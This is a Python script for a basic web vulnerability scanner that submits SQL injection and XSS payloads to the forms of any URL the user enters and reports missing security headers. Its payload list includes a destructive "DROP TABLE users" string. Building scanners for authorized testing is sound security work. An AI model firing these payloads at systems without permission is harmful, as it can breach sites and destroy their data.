import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

# Common payloads
SQL_PAYLOADS = ["' OR '1'='1", "'; DROP TABLE users; --"]
XSS_PAYLOADS = ['<script>alert(1)</script>', '" onmouseover="alert(1)"']

VULNS_FOUND = []

def is_valid_url(url):
    return url.startswith("http")

def get_forms(url):
    try:
        res = requests.get(url, timeout=5)
        soup = BeautifulSoup(res.text, "html.parser")
        return soup.find_all("form")
    except:
        return []

def get_form_details(form):
    details = {}
    try:
        action = form.attrs.get("action", "").strip()
        method = form.attrs.get("method", "get").lower()
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})
        details['action'] = action
        details['method'] = method
        details['inputs'] = inputs
    except:
        pass
    return details

def submit_form(form_details, base_url, payload):
    url = urljoin(base_url, form_details['action'])
    data = {}
    for input in form_details["inputs"]:
        if input["type"] == "text" or input["type"] == "search":
            data[input["name"]] = payload
    try:
        if form_details["method"] == "post":
            return requests.post(url, data=data)
        else:
            return requests.get(url, params=data)
    except:
        return None

def scan_sql_injection(url):
    print("[*] Scanning for SQL Injection...")
    forms = get_forms(url)
    for form in forms:
        form_details = get_form_details(form)
        for payload in SQL_PAYLOADS:
            response = submit_form(form_details, url, payload)
            if response and ("sql" in response.text.lower() or "syntax" in response.text.lower()):
                print(f"[!] SQL Injection vulnerability found on {url}")
                VULNS_FOUND.append(("SQL Injection", url, payload))
                break

def scan_xss(url):
    print("[*] Scanning for XSS...")
    forms = get_forms(url)
    for form in forms:
        form_details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            response = submit_form(form_details, url, payload)
            if response and payload in response.text:
                print(f"[!] XSS vulnerability found on {url}")
                VULNS_FOUND.append(("XSS", url, payload))
                break

def check_security_headers(url):
    print("[*] Checking for security headers...")
    try:
        res = requests.get(url)
        missing = []
        required = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "Content-Security-Policy",
            "Strict-Transport-Security"
        ]
        for header in required:
            if header not in res.headers:
                missing.append(header)
        if missing:
            print(f"[!] Missing security headers: {', '.join(missing)}")
            VULNS_FOUND.append(("Missing Headers", url, ", ".join(missing)))
    except:
        pass

def generate_report():
    print("\n====== Vulnerability Report ======")
    if not VULNS_FOUND:
        print("No critical vulnerabilities detected.")
    else:
        for vuln in VULNS_FOUND:
            print(f"\nType: {vuln[0]}\nURL: {vuln[1]}\nPayload/Details: {vuln[2]}")

# Entry point
if __name__ == "__main__":
    target = input("Enter target URL (e.g., http://example.com): ").strip()
    if not is_valid_url(target):
        print("Invalid URL. Please include http:// or https://")
    else:
        print(f"\n[+] Starting scan on: {target}")
        scan_sql_injection(target)
        scan_xss(target)
        check_security_headers(target)
        generate_report()
